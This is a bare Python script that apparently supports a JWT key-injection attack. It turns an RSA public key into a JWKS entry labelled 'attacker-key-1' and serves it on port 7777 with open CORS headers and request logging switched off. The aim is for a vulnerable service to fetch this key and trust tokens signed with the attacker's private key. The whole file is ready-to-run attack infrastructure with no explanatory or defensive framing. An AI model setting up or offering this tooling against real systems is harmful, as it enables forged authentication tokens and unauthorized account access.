import http.server, socketserver, json, base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

pub = serialization.load_pem_public_key(open('pub.pem','rb').read(), default_backend())
nums = pub.public_numbers()

def b64u(i):
    blen = (i.bit_length()+7)//8
    return base64.urlsafe_b64encode(i.to_bytes(blen,'big')).rstrip(b'=').decode()

jwks = {
  "keys":[{
    "kty":"RSA","kid":"attacker-key-1","use":"sig","alg":"RS256",
    "n": b64u(nums.n),"e": b64u(nums.e)
  }]
}
open('jwks.json','w').write(json.dumps(jwks))

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        if self.path.endswith('/jwks.json'):
            body = open('jwks.json','rb').read()
            self.send_response(200)
            self.send_header('Content-Type','application/json')
            self.send_header('Access-Control-Allow-Origin','*')
            self.send_header('Content-Length',str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()
    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header('Access-Control-Allow-Origin','*')
        self.send_header('Access-Control-Allow-Methods','*')
        self.send_header('Access-Control-Allow-Headers','*')
        self.end_headers()

srv = socketserver.TCPServer(('0.0.0.0',7777), H)
print('serving on 7777', flush=True)
srv.serve_forever()